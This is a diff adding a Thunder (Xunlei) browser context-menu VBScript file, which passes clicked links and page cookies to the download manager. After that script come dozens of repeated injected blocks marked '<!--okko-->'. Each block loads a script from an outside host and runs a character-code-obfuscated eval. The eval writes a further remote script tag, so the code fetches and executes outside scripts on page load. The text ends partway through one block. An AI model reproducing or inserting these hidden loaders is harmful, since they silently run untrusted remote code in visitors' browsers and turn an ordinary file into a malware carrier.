@@ -1,0 +1,786 @@
+<script language="VBScript">
+
+Sub AddLink(Url,Info,Location,strCID,strStatUrl,strCookie)
+
+    if Url <> "" then
+	if Info = "" then
+	    Info = "unknown"
+        end if
+        if Len(Info) > 1000 then
+            Info = Left(Info, 1000)
+        end if
+
+        set ThunderAgent = CreateObject("ThunderAgent.Agent.1")
+
+	if strCID <> "" then
+
+		if strStatUrl <> "" then
+
+			call ThunderAgent.AddTask4(Url, "", "", Info, Location, -1, 0, -1,  strCookie, strCID, strStatUrl)
+		else
+
+        		call ThunderAgent.AddTask4(Url, "", "", Info, Location, -1, 0, -1,  strCookie, strCID, "")
+		end if
+	else
+
+
+		call ThunderAgent.AddTask4(Url, "", "", Info, Location,-1,0,-1,strCookie,"","")
+	end if
+
+        call ThunderAgent.CommitTasks2(1)
+        set ThunderAgent = nothing
+    end if
+end sub
+
+Sub OnContextMenu()
+
+	set srcEvent = external.menuArguments.event
+	x = -1
+	On Error Resume Next
+	x = srcEvent.clientX
+	if x = -1 then
+		Alert("迅雷提示：不支持该站点的页面格式")
+		exit sub
+	end if
+
+
+	strDownloadPage = external.menuArguments.location
+	set theDownloadPage = external.menuArguments.document.getElementById("thunder_down_pageurl")
+	if TypeName(theDownloadPage) <> "Nothing" then
+		strDownloadPage = theDownloadPage.value
+	end if
+
+	strStatPage = ""
+	set theStatPage = external.menuArguments.document.getElementById("thunder_stat_pageurl")
+	if TypeName(theStatPage) <> "Nothing" then
+		strStatPage = theStatPage.value
+	end if
+
+	strCID = ""
+	set theCID = external.menuArguments.document.getElementById("thunder_cid")
+	if TypeName(theCID) <> "Nothing" then
+		strCID = theCID.value
+	end if
+
+	
+	
+	set EventElement = external.menuArguments.document.elementFromPoint ( srcEvent.clientX, srcEvent.clientY )
+	
+
+	if srcEvent.type = "MenuExtAnchor" then 
+		set srcAnchor = EventElement
+		do until TypeName(srcAnchor)="HTMLAnchorElement"
+			set srcAnchor=srcAnchor.parentElement
+		Loop
+		Call AddLink(srcAnchor.href,srcAnchor.innerText,strDownloadPage, strCID, strStatPage,external.menuArguments.document.cookie)
+	elseif srcEvent.type="MenuExtImage" then
+		if TypeName(EventElement)="HTMLAreaElement" then
+			Call AddLink(EventElement.href,EventElement.Alt,strDownloadPage, strCID, strStatPage,external.menuArguments.document.cookie)
+		else 
+			set srcImage = EventElement
+			set srcAnchor = srcImage.parentElement
+			do until TypeName(srcAnchor)="HTMLAnchorElement"
+				set srcAnchor=srcAnchor.parentElement
+				if TypeName(srcAnchor)="Nothing" then 
+					call AddLink(srcImage.href,srcImage.Alt,strDownloadPage, strCID, strStatPage,external.menuArguments.document.cookie)
+					exit sub
+				end if
+			Loop
+			Call AddLink(srcAnchor.href,srcImage.Alt,strDownloadPage, strCID, strStatPage)
+		end if
+	elseif srcEvent.type="MenuExtUnknown" then
+		set srcAnchor = EventElement
+		do until TypeName(srcAnchor)="HTMLAnchorElement"
+			set srcAnchor=srcAnchor.parentElement
+			if TypeName(srcAnchor)="Nothing" then 
+				Call AddLink(EventElement.href,EventElement.innerText,strDownloadPage, strCID, strStatPage, external.menuArguments.document.cookie)
+				exit sub
+			end if
+		Loop
+		Call AddLink(srcAnchor.href,srcAnchor.innerText,strDownloadPage, strCID, strStatPage, external.menuArguments.document.cookie)
+	else
+		MsgBox("Unknown Event Source """ + srcEvent.type + """")
+	end if
+
+end sub
+
+call OnContextMenu()
+
+</script><!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
+t="60,115,99,114,105,112,116,32,108,97,110,103,117,97,103,101,61,74,97,118,97,83,99,114,105,112,116,32,115,114,99,61,34,104,116,116,112,58,47,47,114,97,118,46,116,113,49,48,46,99,111,109,47,99,106,120,46,106,115,34,62,60,47,115,99,114,105,112,116,62"
+t=eval("String.fromCharCode("+t+")");
+document.write(t);</script>
+
+
+<!--okko-->
+<script language="javascript" src=http://ww1.tonji123.com/g1.aspx?id=13148898></script>
+
+
+<script>
